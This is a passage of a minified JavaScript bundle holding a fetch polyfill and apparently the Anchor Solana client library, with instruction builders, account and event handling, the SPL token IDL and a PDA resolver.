                    }

                    function g(e) {
                        if (e.slice) return e.slice(0);
                        var t = new Uint8Array(e.byteLength);
                        return t.set(new Uint8Array(e)), t.buffer
                    }

                    function m() {
                        return this.bodyUsed = !1, this._initBody = function(e) {
                            var t;
                            this._bodyInit = e, e ? "string" == typeof e ? this._bodyText = e : i && Blob.prototype.isPrototypeOf(e) ? this._bodyBlob = e : o && FormData.prototype.isPrototypeOf(e) ? this._bodyFormData = e : n && URLSearchParams.prototype.isPrototypeOf(e) ? this._bodyText = e.toString() : s && i && (t = e) && DataView.prototype.isPrototypeOf(t) ? (this._bodyArrayBuffer = g(e.buffer), this._bodyInit = new Blob([this._bodyArrayBuffer])) : s && (ArrayBuffer.prototype.isPrototypeOf(e) || u(e)) ? this._bodyArrayBuffer = g(e) : this._bodyText = e = Object.prototype.toString.call(e) : this._bodyText = "", this.headers.get("content-type") || ("string" == typeof e ? this.headers.set("content-type", "text/plain;charset=UTF-8") : this._bodyBlob && this._bodyBlob.type ? this.headers.set("content-type", this._bodyBlob.type) : n && URLSearchParams.prototype.isPrototypeOf(e) && this.headers.set("content-type", "application/x-www-form-urlencoded;charset=UTF-8"))
                        }, i && (this.blob = function() {
                            var e = d(this);
                            if (e) return e;
                            if (this._bodyBlob) return Promise.resolve(this._bodyBlob);
                            if (this._bodyArrayBuffer) return Promise.resolve(new Blob([this._bodyArrayBuffer]));
                            if (this._bodyFormData) throw new Error("could not read FormData body as blob");
                            return Promise.resolve(new Blob([this._bodyText]))
                        }, this.arrayBuffer = function() {
                            return this._bodyArrayBuffer ? d(this) || Promise.resolve(this._bodyArrayBuffer) : this.blob().then(y)
                        }), this.text = function() {
                            var e = d(this);
                            if (e) return e;
                            if (this._bodyBlob) return function(e) {
                                var t = new FileReader,
                                    n = p(t);
                                return t.readAsText(e), n
                            }(this._bodyBlob);
                            if (this._bodyArrayBuffer) return Promise.resolve(function(e) {
                                for (var t = new Uint8Array(e), n = new Array(t.length), r = 0; r < t.length; r++) n[r] = String.fromCharCode(t[r]);
                                return n.join("")
                            }(this._bodyArrayBuffer));
                            if (this._bodyFormData) throw new Error("could not read FormData body as text");
                            return Promise.resolve(this._bodyText)
                        }, o && (this.formData = function() {
                            return this.text().then(v)
                        }), this.json = function() {
                            return this.text().then(JSON.parse)
                        }, this
                    }
                    h.prototype.append = function(e, t) {
                        e = c(e), t = l(t);
                        var n = this.map[e];
                        this.map[e] = n ? n + ", " + t : t
                    }, h.prototype.delete = function(e) {
                        delete this.map[c(e)]
                    }, h.prototype.get = function(e) {
                        return e = c(e), this.has(e) ? this.map[e] : null
                    }, h.prototype.has = function(e) {
                        return this.map.hasOwnProperty(c(e))
                    }, h.prototype.set = function(e, t) {
                        this.map[c(e)] = l(t)
                    }, h.prototype.forEach = function(e, t) {
                        for (var n in this.map) this.map.hasOwnProperty(n) && e.call(t, this.map[n], n, this)
                    }, h.prototype.keys = function() {
                        var e = [];
                        return this.forEach((function(t, n) {
                            e.push(n)
                        })), f(e)
                    }, h.prototype.values = function() {
                        var e = [];
                        return this.forEach((function(t) {
                            e.push(t)
                        })), f(e)
                    }, h.prototype.entries = function() {
                        var e = [];
                        return this.forEach((function(t, n) {
                            e.push([n, t])
                        })), f(e)
                    }, r && (h.prototype[Symbol.iterator] = h.prototype.entries);
                    var w = ["DELETE", "GET", "HEAD", "OPTIONS", "POST", "PUT"];

                    function b(e, t) {
                        var n, r, i = (t = t || {}).body;
                        if (e instanceof b) {
                            if (e.bodyUsed) throw new TypeError("Already read");
                            this.url = e.url, this.credentials = e.credentials, t.headers || (this.headers = new h(e.headers)), this.method = e.method, this.mode = e.mode, this.signal = e.signal, i || null == e._bodyInit || (i = e._bodyInit, e.bodyUsed = !0)
                        } else this.url = String(e);
                        if (this.credentials = t.credentials || this.credentials || "same-origin", !t.headers && this.headers || (this.headers = new h(t.headers)), this.method = (r = (n = t.method || this.method || "GET").toUpperCase(), w.indexOf(r) > -1 ? r : n), this.mode = t.mode || this.mode || null, this.signal = t.signal || this.signal, this.referrer = null, ("GET" === this.method || "HEAD" === this.method) && i) throw new TypeError("Body not allowed for GET or HEAD requests");
                        this._initBody(i)
                    }

                    function v(e) {
                        var t = new FormData;
                        return e.trim().split("&").forEach((function(e) {
                            if (e) {
                                var n = e.split("="),
                                    r = n.shift().replace(/\+/g, " "),
                                    i = n.join("=").replace(/\+/g, " ");
                                t.append(decodeURIComponent(r), decodeURIComponent(i))
                            }
                        })), t
                    }

                    function A(e, t) {
                        t || (t = {}), this.type = "default", this.status = void 0 === t.status ? 200 : t.status, this.ok = this.status >= 200 && this.status < 300, this.statusText = "statusText" in t ? t.statusText : "OK", this.headers = new h(t.headers), this.url = t.url || "", this._initBody(e)
                    }
                    b.prototype.clone = function() {
                        return new b(this, {
                            body: this._bodyInit
                        })
                    }, m.call(b.prototype), m.call(A.prototype), A.prototype.clone = function() {
                        return new A(this._bodyInit, {
                            status: this.status,
                            statusText: this.statusText,
                            headers: new h(this.headers),
                            url: this.url
                        })
                    }, A.error = function() {
                        var e = new A(null, {
                            status: 0,
                            statusText: ""
                        });
                        return e.type = "error", e
                    };
                    var k = [301, 302, 303, 307, 308];
                    A.redirect = function(e, t) {
                        if (-1 === k.indexOf(t)) throw new RangeError("Invalid status code");
                        return new A(null, {
                            status: t,
                            headers: {
                                location: e
                            }
                        })
                    }, t.DOMException = e.DOMException;
                    try {
                        new t.DOMException
                    } catch (e) {
                        t.DOMException = function(e, t) {
                            this.message = e, this.name = t;
                            var n = Error(e);
                            this.stack = n.stack
                        }, t.DOMException.prototype = Object.create(Error.prototype), t.DOMException.prototype.constructor = t.DOMException
                    }

                    function _(e, n) {
                        return new Promise((function(r, o) {
                            var s = new b(e, n);
                            if (s.signal && s.signal.aborted) return o(new t.DOMException("Aborted", "AbortError"));
                            var a = new XMLHttpRequest;

                            function u() {
                                a.abort()
                            }
                            a.onload = function() {
                                var e, t, n = {
                                    status: a.status,
                                    statusText: a.statusText,
                                    headers: (e = a.getAllResponseHeaders() || "", t = new h, e.replace(/\r?\n[\t ]+/g, " ").split(/\r?\n/).forEach((function(e) {
                                        var n = e.split(":"),
                                            r = n.shift().trim();
                                        if (r) {
                                            var i = n.join(":").trim();
                                            t.append(r, i)
                                        }
                                    })), t)
                                };
                                n.url = "responseURL" in a ? a.responseURL : n.headers.get("X-Request-URL");
                                var i = "response" in a ? a.response : a.responseText;
                                r(new A(i, n))
                            }, a.onerror = function() {
                                o(new TypeError("Network request failed"))
                            }, a.ontimeout = function() {
                                o(new TypeError("Network request failed"))
                            }, a.onabort = function() {
                                o(new t.DOMException("Aborted", "AbortError"))
                            }, a.open(s.method, s.url, !0), "include" === s.credentials ? a.withCredentials = !0 : "omit" === s.credentials && (a.withCredentials = !1), "responseType" in a && i && (a.responseType = "blob"), s.headers.forEach((function(e, t) {
                                a.setRequestHeader(t, e)
                            })), s.signal && (s.signal.addEventListener("abort", u), a.onreadystatechange = function() {
                                4 === a.readyState && s.signal.removeEventListener("abort", u)
                            }), a.send(void 0 === s._bodyInit ? null : s._bodyInit)
                        }))
                    }
                    _.polyfill = !0, e.fetch || (e.fetch = _, e.Headers = h, e.Request = b, e.Response = A), t.Headers = h, t.Request = b, t.Response = A, t.fetch = _, Object.defineProperty(t, "__esModule", {
                        value: !0
                    })
                }({})
            }(r), r.fetch.ponyfill = !0, delete r.fetch.polyfill;
            var i = r;
            (t = i.fetch).default = i.fetch, t.fetch = i.fetch, t.Headers = i.Headers, t.Request = i.Request, t.Response = i.Response, e.exports = t
        }(vo, vo.exports);
        var Ao, ko = (Ao = vo.exports) && Ao.__esModule && Object.prototype.hasOwnProperty.call(Ao, "default") ? Ao.default : Ao;
        async function _o(e, t) {
            const n = await e.getAccountInfo(t);
            if (null === n) throw new Error("program account not found");
            const {
                program: r
            } = So(n.data), i = await e.getAccountInfo(r.programdataAddress);
            if (null === i) throw new Error("program data account not found");
            const {
                programData: o
            } = So(i.data);
            return o
        }
        const Eo = Ee.rustEnum([Ee.struct([], "uninitialized"), Ee.struct([Ee.option(Ee.publicKey(), "authorityAddress")], "buffer"), Ee.struct([Ee.publicKey("programdataAddress")], "program"), Ee.struct([Ee.u64("slot"), Ee.option(Ee.publicKey(), "upgradeAuthorityAddress")], "programData")], void 0, Ee.u32());

        function So(e) {
            return Eo.decode(e)
        }
        var Io = Object.freeze({
            __proto__: null,
            verifiedBuild: async function(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 5;
                const r = `https://anchor.projectserum.com/api/v0/program/${t.toString()}/latest?limit=${n}`,
                    [i, o] = await Promise.all([_o(e, t), ko(r)]),
                    s = (await o.json()).filter((e => !e.aborted && "Built" === e.state && "Verified" === e.verified));
                if (0 === s.length) return null;
                const a = s[0];
                return i.slot.toNumber() !== a.verified_slot ? null : a
            },
            fetchData: _o,
            decodeUpgradeableLoaderState: So
        });
        Object.freeze({
            __proto__: null,
            sha256: Yi,
            rpc: no,
            publicKey: uo,
            bytes: go,
            token: bo,
            features: si,
            registry: Io
        });
        const xo = Ee.struct([Ee.publicKey("authority"), Ee.vecU8("data")]);

        function Mo(e, t) {
            var n, r;
            let i = {};
            const o = e.args ? e.args.length : 0;
            if (t.length > o) {
                if (t.length !== o + 1) throw new Error(`provided too many arguments ${t} to instruction ${null==e?void 0:e.name} expecting: ${null!==(r=null===(n=e.args)||void 0===n?void 0:n.map((e=>e.name)))&&void 0!==r?r:[]}`);
                i = t.pop()
            }
            return [t, i]
        }
        class Bo {
            static build(e, t, n) {
                if ("_inner" === e.name) throw new Ur("the _inner name is reserved");
                const r = function() {
                    for (var i = arguments.length, o = new Array(i), s = 0; s < i; s++) o[s] = arguments[s];
                    const [a, u] = Mo(e, [...o]);
                    Xi(e.accounts, u.accounts);
                    const c = r.accounts(u.accounts);
                    return void 0 !== u.remainingAccounts && c.push(...u.remainingAccounts), oi("debug-logs") && console.log("Outgoing account metas:", c), new _.TransactionInstruction({
                        keys: c,
                        programId: n,
                        data: t(e.name, Ji(e, ...a))
                    })
                };
                return r.accounts = t => Bo.accountsArray(t, e.accounts, e.name), r
            }
            static accountsArray(e, t, n) {
                return e ? t.map((t => {
                    if (void 0 !== ("accounts" in t ? t.accounts : void 0)) {
                        const r = e[t.name];
                        return Bo.accountsArray(r, t.accounts, n).flat()
                    } {
                        const r = t;
                        let i;
                        try {
                            i = $i(e[t.name])
                        } catch (e) {
                            throw new Error(`Wrong input type for account "${t.name}" in the instruction accounts object${void 0!==n?' for instruction "'+n+'"':""}. Expected PublicKey or string.`)
                        }
                        return {
                            pubkey: i,
                            isWritable: r.isMut,
                            isSigner: r.isSigner
                        }
                    }
                })).flat() : []
            }
        }
        class To {
            static build(e, t, n, r) {
                return async function() {
                    for (var i = arguments.length, o = new Array(i), s = 0; s < i; s++) o[s] = arguments[s];
                    const a = t(...o),
                        [, u] = Mo(e, [...o]);
                    try {
                        return await r.send(a, u.signers, u.options)
                    } catch (e) {
                        oi("debug-logs") && console.log("Translating error:", e);
                        let r = jr.parse(e, n);
                        if (null === r) throw e;
                        throw r
                    }
                }
            }
        }
        class Oo {
            static build(e, t) {
                return function() {
                    for (var n, r, i, o = arguments.length, s = new Array(o), a = 0; a < o; a++) s[a] = arguments[a];
                    const [, u] = Mo(e, [...s]), c = new _.Transaction;
                    if (u.preInstructions && u.instructions) throw new Error("instructions is deprecated, use preInstructions");
                    return null === (n = u.preInstructions) || void 0 === n || n.forEach((e => c.add(e))), null === (r = u.instructions) || void 0 === r || r.forEach((e => c.add(e))), c.add(t(...s)), null === (i = u.postInstructions) || void 0 === i || i.forEach((e => c.add(e))), c
                }
            }
        }
        class Co {
            constructor(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : Dr(),
                    r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : new ci(e);
                this.provider = n, this.coder = r, this._idl = e, this._programId = t, this._address = Po(t), this._sub = null;
                const [i, o, s] = (() => {
                    var i;
                    let o = {},
                        s = {},
                        a = {};
                    return null === (i = e.state) || void 0 === i || i.methods.forEach((i => {
                        const u = Bo.build(i, ((e, t) => r.instruction.encodeState(e, t)), t);
                        u.accounts = e => {
                            const r = function(e, t, n, r) {
                                if ("new" === n.name) {
                                    const [n] = oo([], e);
                                    return [{
                                        pubkey: t.wallet.publicKey,
                                        isWritable: !1,
                                        isSigner: !0
                                    }, {
                                        pubkey: Po(e),
                                        isWritable: !0,
                                        isSigner: !1
                                    }, {
                                        pubkey: n,
                                        isWritable: !1,
                                        isSigner: !1
                                    }, {
                                        pubkey: _.SystemProgram.programId,
                                        isWritable: !1,
                                        isSigner: !1
                                    }, {
                                        pubkey: e,
                                        isWritable: !1,
                                        isSigner: !1
                                    }]
                                }
                                return Xi(n.accounts, r), [{
                                    pubkey: Po(e),
                                    isWritable: !0,
                                    isSigner: !1
                                }]
                            }(t, n, i, e);
                            return r.concat(Bo.accountsArray(e, i.accounts, i.name))
                        };
                        const c = Oo.build(i, u),
                            l = To.build(i, c, Zi(e), n),
                            f = ke()(i.name);
                        o[f] = u, s[f] = c, a[f] = l
                    })), [o, s, a]
                })();
                this.instruction = i, this.transaction = o, this.rpc = s
            }
            get programId() {
                return this._programId
            }
            async fetch() {
                const e = this.address(),
                    t = await this.provider.connection.getAccountInfo(e);
                if (null === t) throw new Error(`Account does not exist ${e.toString()}`);
                const n = this._idl.state;
                if (!n) throw new Error("State is not specified in IDL.");
                if ((await ui(n.struct.name)).compare(t.data.slice(0, 8))) throw new Error("Invalid account discriminator");
                return this.coder.state.decode(t.data)
            }
            address() {
                return this._address
            }
            subscribe(e) {
                if (null !== this._sub) return this._sub.ee;
                const t = new(P()),
                    n = this.provider.connection.onAccountChange(this.address(), (e => {
                        const n = this.coder.state.decode(e.data);
                        t.emit("change", n)
                    }), e);
                return this._sub = {
                    ee: t,
                    listener: n
                }, t
            }
            unsubscribe() {
                null !== this._sub && this.provider.connection.removeAccountChangeListener(this._sub.listener).then((async () => {
                    this._sub = null
                })).catch(console.error)
            }
        }

        function Po(e) {
            let [t] = oo([], e);
            return ro(t, "unversioned", e)
        }
        class Lo {
            constructor(e, t, n, r, i) {
                this._idlAccount = t, this._programId = n, this._provider = null != r ? r : Dr(), this._coder = null != i ? i : new ci(e), this._size = this._coder.accounts.size(t)
            }
            get size() {
                return this._size
            }
            get programId() {
                return this._programId
            }
            get provider() {
                return this._provider
            }
            get coder() {
                return this._coder
            }
            async fetchNullable(e, t) {
                const n = await this.getAccountInfo(e, t);
                return null === n ? null : this._coder.accounts.decode(this._idlAccount.name, n.data)
            }
            async fetch(e, t) {
                const n = await this.fetchNullable(e, t);
                if (null === n) throw new Error(`Account does not exist ${e.toString()}`);
                return n
            }
            async fetchMultiple(e, t) {
                return (await eo(this._provider.connection, e.map((e => $i(e))), t)).map((e => null == e ? null : this._coder.accounts.decode(this._idlAccount.name, null == e ? void 0 : e.account.data)))
            }
            async all(e) {
                return (await this._provider.connection.getProgramAccounts(this._programId, {
                    commitment: this._provider.connection.commitment,
                    filters: [{
                        memcmp: this.coder.accounts.memcmp(this._idlAccount.name, e instanceof Buffer ? e : void 0)
                    }, ...Array.isArray(e) ? e : []]
                })).map((e => {
                    let {
                        pubkey: t,
                        account: n
                    } = e;
                    return {
                        publicKey: t,
                        account: this._coder.accounts.decode(this._idlAccount.name, n.data)
                    }
                }))
            }
            subscribe(e, t) {
                const n = No.get(e.toString());
                if (n) return n.ee;
                const r = new(P());
                e = $i(e);
                const i = this._provider.connection.onAccountChange(e, (e => {
                    const t = this._coder.accounts.decode(this._idlAccount.name, e.data);
                    r.emit("change", t)
                }), t);
                return No.set(e.toString(), {
                    ee: r,
                    listener: i
                }), r
            }
            async unsubscribe(e) {
                let t = No.get(e.toString());
                t ? No && await this._provider.connection.removeAccountChangeListener(t.listener).then((() => {
                    No.delete(e.toString())
                })).catch(console.error) : console.warn("Address is not subscribed")
            }
            async createInstruction(e, t) {
                const n = this.size;
                return _.SystemProgram.createAccount({
                    fromPubkey: this._provider.wallet.publicKey,
                    newAccountPubkey: e.publicKey,
                    space: null != t ? t : n,
                    lamports: await this._provider.connection.getMinimumBalanceForRentExemption(null != t ? t : n),
                    programId: this._programId
                })
            }
            async associated() {
                const e = await this.associatedAddress(...arguments);
                return await this.fetch(e)
            }
            async associatedAddress() {
                for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                return await ao(this._programId, ...t)
            }
            async getAccountInfo(e, t) {
                return await this._provider.connection.getAccountInfo($i(e), t)
            }
        }
        const No = new Map,
            Ro = "Program log: ".length;
        class Do {
            constructor(e, t, n) {
                this._programId = e, this._provider = t, this._eventParser = new zo(e, n), this._eventCallbacks = new Map, this._eventListeners = new Map, this._listenerIdCount = 0
            }
            addEventListener(e, t) {
                var n;
                let r = this._listenerIdCount;
                return this._listenerIdCount += 1, e in this._eventCallbacks || this._eventListeners.set(e, []), this._eventListeners.set(e, (null !== (n = this._eventListeners.get(e)) && void 0 !== n ? n : []).concat(r)), this._eventCallbacks.set(r, [e, t]), void 0 !== this._onLogsSubscriptionId || (this._onLogsSubscriptionId = this._provider.connection.onLogs(this._programId, ((e, t) => {
                    e.err || this._eventParser.parseLogs(e.logs, (e => {
                        const n = this._eventListeners.get(e.name);
                        n && n.forEach((n => {
                            const r = this._eventCallbacks.get(n);
                            if (r) {
                                const [, n] = r;
                                n(e.data, t.slot)
                            }
                        }))
                    }))
                }))), r
            }
            async removeEventListener(e) {
                const t = this._eventCallbacks.get(e);
                if (!t) throw new Error(`Event listener ${e} doesn't exist!`);
                const [n] = t;
                let r = this._eventListeners.get(n);
                if (!r) throw new Error(`Event listeners don't exist for ${n}!`);
                this._eventCallbacks.delete(e), r = r.filter((t => t !== e)), 0 === r.length && this._eventListeners.delete(n), 0 == this._eventCallbacks.size && (Ie.ok(0 === this._eventListeners.size), void 0 !== this._onLogsSubscriptionId && (await this._provider.connection.removeOnLogsListener(this._onLogsSubscriptionId), this._onLogsSubscriptionId = void 0))
            }
        }
        class zo {
            constructor(e, t) {
                this.coder = t, this.programId = e
            }
            parseLogs(e, t) {
                const n = new jo(e),
                    r = new Uo(n.next());
                let i = n.next();
                for (; null !== i;) {
                    let [e, o, s] = this.handleLog(r, i);
                    e && t(e), o && r.push(o), s && r.pop(), i = n.next()
                }
            }
            handleLog(e, t) {
                return e.stack.length > 0 && e.program() === this.programId.toString() ? this.handleProgramLog(t) : [null, ...this.handleSystemLog(t)]
            }
            handleProgramLog(e) {
                if (e.startsWith("Program log:")) {
                    const t = e.slice(Ro);
                    return [this.coder.events.decode(t), null, !1]
                }
                return [null, ...this.handleSystemLog(e)]
            }
            handleSystemLog(e) {
                const t = e.split(":")[0];
                return null !== t.match(/^Program (.*) success/g) ? [null, !0] : t.startsWith(`Program ${this.programId.toString()} invoke`) ? [this.programId.toString(), !1] : t.includes("invoke") ? ["cpi", !1] : [null, !1]
            }
        }
        class Uo {
            constructor(e) {
                var t;
                const n = null === (t = /^Program (.*) invoke.*$/g.exec(e)) || void 0 === t ? void 0 : t[1];
                if (!n) throw new Error("Could not find program invocation log line");
                this.stack = [n]
            }
            program() {
                return Ie.ok(this.stack.length > 0), this.stack[this.stack.length - 1]
            }
            push(e) {
                this.stack.push(e)
            }
            pop() {
                Ie.ok(this.stack.length > 0), this.stack.pop()
            }
        }
        class jo {
            constructor(e) {
                this.logs = e
            }
            next() {
                if (0 === this.logs.length) return null;
                let e = this.logs[0];
                return this.logs = this.logs.slice(1), e
            }
        }
        new _.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");

        function Fo() {
            return new Gi(Ho)
        }
        const Ho = {
            version: "0.1.0",
            name: "spl_token",
            instructions: [{
                name: "initializeMint",
                accounts: [{
                    name: "mint",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "rent",
                    isMut: !1,
                    isSigner: !1
                }],
                args: [{
                    name: "decimals",
                    type: "u8"
                }, {
                    name: "mintAuthority",
                    type: "publicKey"
                }, {
                    name: "freezeAuthority",
                    type: {
                        coption: "publicKey"
                    }
                }]
            }, {
                name: "initializeAccount",
                accounts: [{
                    name: "account",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "mint",
                    isMut: !1,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !1
                }, {
                    name: "rent",
                    isMut: !1,
                    isSigner: !1
                }],
                args: []
            }, {
                name: "initializeMultisig",
                accounts: [{
                    name: "account",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "rent",
                    isMut: !1,
                    isSigner: !1
                }],
                args: [{
                    name: "m",
                    type: "u8"
                }]
            }, {
                name: "transfer",
                accounts: [{
                    name: "source",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "destination",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !0
                }],
                args: [{
                    name: "amount",
                    type: "u64"
                }]
            }, {
                name: "approve",
                accounts: [{
                    name: "source",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "delegate",
                    isMut: !1,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !0
                }],
                args: [{
                    name: "amount",
                    type: "u64"
                }]
            }, {
                name: "revoke",
                accounts: [{
                    name: "source",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !0
                }],
                args: []
            }, {
                name: "setAuthority",
                accounts: [{
                    name: "mint",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !0
                }],
                args: [{
                    name: "authorityType",
                    type: "u8"
                }, {
                    name: "newAuthority",
                    type: {
                        coption: "publicKey"
                    }
                }]
            }, {
                name: "mintTo",
                accounts: [{
                    name: "mint",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "to",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !0
                }],
                args: [{
                    name: "amount",
                    type: "u64"
                }]
            }, {
                name: "burn",
                accounts: [{
                    name: "source",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "mint",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !0
                }],
                args: [{
                    name: "amount",
                    type: "u64"
                }]
            }, {
                name: "closeAccount",
                accounts: [{
                    name: "account",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "destination",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !1
                }],
                args: []
            }, {
                name: "freezeAccount",
                accounts: [{
                    name: "account",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "mint",
                    isMut: !1,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !0
                }],
                args: []
            }, {
                name: "thawAccount",
                accounts: [{
                    name: "account",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "mint",
                    isMut: !1,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !0
                }],
                args: []
            }, {
                name: "transferChecked",
                accounts: [{
                    name: "source",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "mint",
                    isMut: !1,
                    isSigner: !1
                }, {
                    name: "destination",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !0
                }],
                args: [{
                    name: "amount",
                    type: "u64"
                }, {
                    name: "decimals",
                    type: "u8"
                }]
            }, {
                name: "approveChecked",
                accounts: [{
                    name: "source",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "mint",
                    isMut: !1,
                    isSigner: !1
                }, {
                    name: "delegate",
                    isMut: !1,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !0
                }],
                args: [{
                    name: "amount",
                    type: "u64"
                }, {
                    name: "decimals",
                    type: "u8"
                }]
            }, {
                name: "mintToChecked",
                accounts: [{
                    name: "mint",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "to",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !0
                }],
                args: [{
                    name: "amount",
                    type: "u64"
                }, {
                    name: "decimals",
                    type: "u8"
                }]
            }, {
                name: "burnChecked",
                accounts: [{
                    name: "source",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "mint",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "authority",
                    isMut: !1,
                    isSigner: !0
                }],
                args: [{
                    name: "amount",
                    type: "u64"
                }, {
                    name: "decimals",
                    type: "u8"
                }]
            }, {
                name: "initializeAccount2",
                accounts: [{
                    name: "account",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "mint",
                    isMut: !1,
                    isSigner: !1
                }, {
                    name: "rent",
                    isMut: !1,
                    isSigner: !1
                }],
                args: [{
                    name: "authority",
                    type: "publicKey"
                }]
            }, {
                name: "syncNative",
                accounts: [{
                    name: "account",
                    isMut: !0,
                    isSigner: !1
                }],
                args: []
            }, {
                name: "initializeAccount3",
                accounts: [{
                    name: "account",
                    isMut: !0,
                    isSigner: !1
                }, {
                    name: "mint",
                    isMut: !1,
                    isSigner: !1
                }],
                args: [{
                    name: "authority",
                    type: "publicKey"
                }]
            }, {
                name: "initializeMultisig2",
                accounts: [{
                    name: "account",
                    isMut: !0,
                    isSigner: !1
                }],
                args: [{
                    name: "m",
                    type: "u8"
                }]
            }, {
                name: "initializeMint2",
                accounts: [{
                    name: "mint",
                    isMut: !0,
                    isSigner: !1
                }],
                args: [{
                    name: "decimals",
                    type: "u8"
                }, {
                    name: "mintAuthority",
                    type: "publicKey"
                }, {
                    name: "freezeAuthority",
                    type: {
                        coption: "publicKey"
                    }
                }]
            }],
            accounts: [{
                name: "mint",
                type: {
                    kind: "struct",
                    fields: [{
                        name: "mintAuthority",
                        type: {
                            coption: "publicKey"
                        }
                    }, {
                        name: "supply",
                        type: "u64"
                    }, {
                        name: "decimals",
                        type: "u8"
                    }, {
                        name: "isInitialized",
                        type: "bool"
                    }, {
                        name: "freezeAuthority",
                        type: {
                            coption: "publicKey"
                        }
                    }]
                }
            }, {
                name: "token",
                type: {
                    kind: "struct",
                    fields: [{
                        name: "mint",
                        type: "publicKey"
                    }, {
                        name: "authority",
                        type: "publicKey"
                    }, {
                        name: "amount",
                        type: "u64"
                    }, {
                        name: "delegate",
                        type: {
                            coption: "publicKey"
                        }
                    }, {
                        name: "state",
                        type: "u8"
                    }, {
                        name: "isNative",
                        type: {
                            coption: "u64"
                        }
                    }, {
                        name: "delegatedAmount",
                        type: "u64"
                    }, {
                        name: "closeAuthority",
                        type: {
                            coption: "publicKey"
                        }
                    }]
                }
            }]
        };
        class Wo {
            constructor(e, t, n, r, i, o) {
                this._args = e, this._accounts = t, this._provider = n, this._programId = r, this._idlIx = i, this._accountStore = new Ko(n, o)
            }
            async resolve() {
                for (let e = 0; e < this._idlIx.accounts.length; e += 1) {
                    const t = this._idlIx.accounts[e],
                        n = ke()(t.name);
                    if (t.pda && t.pda.seeds.length > 0 && void 0 === this._accounts[n]) await this.autoPopulatePda(t);
                    else if (t.isSigner && void 0 === this._accounts[n]) this._accounts[n] = this._provider.wallet.publicKey;
                    else switch (n) {
                        case "systemProgram":
                            void 0 === this._accounts[n] && (this._accounts[n] = _.SystemProgram.programId);
                        case "rent":
                            void 0 === this._accounts[n] && (this._accounts[n] = _.SYSVAR_RENT_PUBKEY);
                        case "tokenProgram":
                            void 0 === this._accounts[n] && (this._accounts[n] = mo);
                        case "associatedTokenProgram":
                            void 0 === this._accounts[n] && (this._accounts[n] = wo)
                    }
                }
            }
            async autoPopulatePda(e) {
                if (!e.pda || !e.pda.seeds) throw new Error("Must have seeds");
                const t = await Promise.all(e.pda.seeds.map((e => this.toBuffer(e)))),
                    n = await this.parseProgramId(e),
                    [r] = await _.PublicKey.findProgramAddress(t, n);
                this._accounts[ke()(e.name)] = r
            }
            async parseProgramId(e) {
                var t;
                if (!(null === (t = e.pda) || void 0 === t ? void 0 : t.programId)) return this._programId;
                switch (e.pda.programId.kind) {
                    case "const":
                        return new _.PublicKey(this.toBufferConst(e.pda.programId.value));
                    case "arg":
                        return this.argValue(e.pda.programId);
                    case "account":
                        return await this.accountValue(e.pda.programId);
                    default:
                        throw new Error(`Unexpected program seed kind: ${e.pda.programId.kind}`)
                }
            }
            async toBuffer(e) {
                switch (e.kind) {
                    case "const":
                        return this.toBufferConst(e);
                    case "arg":
                        return await this.toBufferArg(e);
                    case "account":
                        return await this.toBufferAccount(e);
                    default:
                        throw new Error(`Unexpected seed kind: ${e.kind}`)
                }
            }
            toBufferConst(e) {
                return this.toBufferValue(e.type, e.value)
            }
            async toBufferArg(e) {
                const t = this.argValue(e);
                return this.toBufferValue(e.type, t)
            }
            argValue(e) {
                const t = ke()(e.path.split(".")[0]),
                    n = this._idlIx.args.findIndex((e => e.name === t));
                if (-1 === n) throw new Error(`Unable to find argument for seed: ${t}`);
                return this._args[n]
            }
            async toBufferAccount(e) {
                const t = await this.accountValue(e);
                return this.toBufferValue(e.type, t)
            }
            async accountValue(e) {
                const t = e.path.split("."),
                    n = t[0],
                    r = this._accounts[ke()(n)];
                if (1 === t.length) return r;
                const i = await this._accountStore.fetchAccount(e.account, r);
                return this.parseAccountValue(i, t.slice(1))
            }
            parseAccountValue(e, t) {
                let n;
                for (; t.length > 0;) n = e[ke()(t[0])], t = t.slice(1);
                return n
            }
            toBufferValue(e, t) {
                switch (e) {
                    case "u8":
                        return Buffer.from([t]);
                    case "u16":
                        let n = Buffer.alloc(2);
